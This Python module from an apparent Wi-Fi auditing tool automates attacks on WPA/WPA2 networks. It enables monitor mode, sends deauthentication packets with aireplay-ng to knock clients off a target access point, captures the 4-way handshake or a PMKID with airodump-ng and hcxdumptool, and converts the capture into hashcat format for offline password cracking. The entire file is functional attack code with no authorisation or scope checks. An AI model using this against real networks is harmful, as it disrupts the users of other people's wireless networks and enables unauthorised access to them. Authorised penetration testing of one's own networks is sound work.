"""
capture.py - WPA/WPA2 handshake capture and PMKID attack support
"""

import os
import signal
import subprocess
import time
from pathlib import Path
from typing import Optional

from rich.progress import Progress, SpinnerColumn, TimeElapsedColumn, TextColumn
from rich.prompt import Confirm

from utils import console, get_logger, run_command, SESSION

log = get_logger()

OUTPUT_DIR = Path("/tmp/wifi_audit_captures")
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)


# ─── Monitor mode helpers ────────────────────────────────────────────────────

def enable_monitor_mode(iface: str) -> Optional[str]:
    """
    Put *iface* into monitor mode using airmon-ng.
    Returns the monitor interface name (e.g. 'wlan0mon') or None on failure.
    """
    console.print(f"[cyan]Enabling monitor mode on {iface} ...[/cyan]")
    log.info("Enabling monitor mode on %s", iface)

    # Kill interfering processes first
    run_command(["airmon-ng", "check", "kill"], timeout=10)
    time.sleep(1)

    result = run_command(["airmon-ng", "start", iface], timeout=15)
    if result.returncode != 0:
        console.print(f"[red]Failed to enable monitor mode:[/red] {result.stderr}")
        log.error("airmon-ng start failed: %s", result.stderr)
        return None

    # Detect the new monitor interface name
    for line in result.stdout.splitlines():
        if "monitor mode" in line.lower() and "enabled" in line.lower():
            # Typical output: "monitor mode enabled on wlan0mon"
            parts = line.split()
            for part in reversed(parts):
                if part.startswith("wlan") or part.startswith("mon"):
                    log.info("Monitor interface: %s", part.rstrip(")"))
                    return part.rstrip(")")

    # Fallback: append 'mon'
    mon_iface = iface + "mon" if not iface.endswith("mon") else iface
    console.print(f"[yellow]Could not parse monitor interface name, assuming: {mon_iface}[/yellow]")
    return mon_iface


def disable_monitor_mode(mon_iface: str, original_iface: str) -> None:
    """Restore interface to managed mode."""
    console.print(f"[cyan]Restoring {mon_iface} to managed mode ...[/cyan]")
    run_command(["airmon-ng", "stop", mon_iface], timeout=15)
    run_command(["service", "NetworkManager", "start"], timeout=10)
    log.info("Monitor mode stopped on %s", mon_iface)


# ─── Handshake capture ───────────────────────────────────────────────────────

def _capture_prefix(ssid: str) -> str:
    safe = "".join(c for c in ssid if c.isalnum() or c in "-_")[:20]
    ts = time.strftime("%Y%m%d_%H%M%S")
    return str(OUTPUT_DIR / f"cap_{safe}_{ts}")


def capture_handshake(
    mon_iface: str,
    bssid: str,
    channel: int,
    ssid: str,
    timeout: int = 60,
    deauth_count: int = 5,
) -> Optional[str]:
    """
    Capture a WPA/WPA2 4-way handshake.

    Steps:
      1. Start airodump-ng focused on the target AP
      2. Send deauth packets to force a client reconnect
      3. Wait for handshake and return the .cap file path

    Returns path to the .cap file, or None if capture failed.
    """
    prefix = _capture_prefix(ssid)
    cap_file = prefix + "-01.cap"

    console.print(
        f"\n[bold]Capturing handshake[/bold]\n"
        f"  Target : [cyan]{ssid}[/cyan] ({bssid})\n"
        f"  Channel: {channel}\n"
        f"  Output : {cap_file}\n"
    )

    # Clean up any prior files
    for ext in ["-01.cap", "-01.csv", "-01.kismet.csv", "-01.kismet.netxml", "-01.log.csv"]:
        try:
            os.remove(prefix + ext)
        except FileNotFoundError:
            pass

    # Start airodump-ng on the target channel/BSSID
    airodump_cmd = [
        "airodump-ng",
        "--bssid", bssid,
        "--channel", str(channel),
        "--write", prefix,
        "--output-format", "pcap",
        mon_iface,
    ]
    log.info("Starting airodump-ng: %s", " ".join(airodump_cmd))

    try:
        airodump_proc = subprocess.Popen(
            airodump_cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except FileNotFoundError:
        console.print("[red]airodump-ng not found.[/red]")
        return None

    # Give airodump-ng a moment to initialize
    time.sleep(3)

    # Send deauth packets to force handshake
    _send_deauth(mon_iface, bssid, deauth_count)

    # Wait for handshake with live feedback
    handshake_found = _wait_for_handshake(cap_file, timeout, bssid, ssid)

    airodump_proc.terminate()
    try:
        airodump_proc.wait(timeout=3)
    except subprocess.TimeoutExpired:
        airodump_proc.kill()

    if handshake_found:
        console.print(f"\n[bold green]Handshake captured![/bold green] Saved to: [cyan]{cap_file}[/cyan]")
        log.info("Handshake captured: %s", cap_file)
        SESSION.setdefault("captures", []).append(cap_file)
        return cap_file
    else:
        console.print("\n[red]Handshake not captured within timeout.[/red]")
        console.print("[yellow]Tip: Ensure there are active clients on the target network.[/yellow]")
        log.warning("Handshake capture failed for %s", bssid)
        return None


def _send_deauth(mon_iface: str, bssid: str, count: int) -> None:
    """Send deauthentication frames (broadcast) to force clients to reconnect."""
    console.print(f"[yellow]Sending {count} deauth packets to {bssid} ...[/yellow]")
    log.info("Sending deauth: iface=%s bssid=%s count=%d", mon_iface, bssid, count)
    result = run_command(
        ["aireplay-ng", "--deauth", str(count), "-a", bssid, mon_iface],
        timeout=20,
    )
    if result.returncode != 0:
        console.print(f"[red]Deauth failed:[/red] {result.stderr[:200]}")
        log.warning("Deauth failed: %s", result.stderr[:200])
    else:
        console.print("[green]Deauth packets sent.[/green]")


def _wait_for_handshake(cap_file: str, timeout: int, bssid: str, ssid: str) -> bool:
    """Poll the cap file for a valid handshake using aircrack-ng --test."""
    deadline = time.time() + timeout
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        task = progress.add_task(f"Waiting for handshake from [cyan]{ssid}[/cyan] ...", total=None)

        while time.time() < deadline:
            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0:
                result = run_command(
                    ["aircrack-ng", "-a", "2", "-b", bssid, cap_file],
                    timeout=10,
                )
                if "1 handshake" in result.stdout or "Handshake" in result.stdout:
                    progress.update(task, description="[green]Handshake detected![/green]")
                    return True
            time.sleep(2)

    return False


# ─── PMKID attack ────────────────────────────────────────────────────────────

def capture_pmkid(mon_iface: str, bssid: str, ssid: str, timeout: int = 30) -> Optional[str]:
    """
    Capture PMKID using hcxdumptool (no client required).
    Returns path to the .pcapng file, or None on failure.
    """
    import shutil
    if not shutil.which("hcxdumptool"):
        console.print("[red]hcxdumptool not found. Install: sudo apt install hcxdumptool[/red]")
        return None

    prefix = _capture_prefix(ssid)
    pcapng_file = prefix + "_pmkid.pcapng"
    filterfile = prefix + "_filter.txt"

    # Write BSSID filter (one MAC per line, no colons)
    mac_no_colon = bssid.replace(":", "").lower()
    with open(filterfile, "w") as fh:
        fh.write(mac_no_colon + "\n")

    console.print(
        f"[bold]PMKID capture[/bold] on [cyan]{ssid}[/cyan] ({bssid})\n"
        f"  Output: {pcapng_file}\n"
        f"  Timeout: {timeout}s\n"
    )
    log.info("Starting PMKID capture: iface=%s bssid=%s", mon_iface, bssid)

    cmd = [
        "hcxdumptool",
        "-i", mon_iface,
        "-o", pcapng_file,
        "--filterlist_ap=" + filterfile,
        "--filtermode=2",
        "--enable_status=1",
    ]

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(timeout)
        proc.terminate()
        proc.wait(timeout=3)
    except FileNotFoundError:
        console.print("[red]hcxdumptool not found.[/red]")
        return None

    if os.path.exists(pcapng_file) and os.path.getsize(pcapng_file) > 0:
        console.print(f"[green]PMKID capture saved:[/green] {pcapng_file}")
        log.info("PMKID capture saved: %s", pcapng_file)
        SESSION.setdefault("pmkid_captures", []).append(pcapng_file)
        return pcapng_file
    else:
        console.print("[red]No PMKID data captured.[/red]")
        return None


def convert_pmkid_to_hashcat(pcapng_file: str) -> Optional[str]:
    """Convert a pcapng PMKID capture to hashcat format using hcxpcapngtool."""
    import shutil
    if not shutil.which("hcxpcapngtool"):
        console.print("[red]hcxpcapngtool not found. Install: sudo apt install hcxtools[/red]")
        return None

    hash_file = pcapng_file.replace(".pcapng", ".hc22000")
    result = run_command(["hcxpcapngtool", "-o", hash_file, pcapng_file], timeout=30)
    if result.returncode == 0 and os.path.exists(hash_file):
        console.print(f"[green]Hashcat format:[/green] {hash_file}")
        log.info("PMKID converted to hashcat format: %s", hash_file)
        return hash_file
    console.print(f"[red]Conversion failed:[/red] {result.stderr[:200]}")
    return None
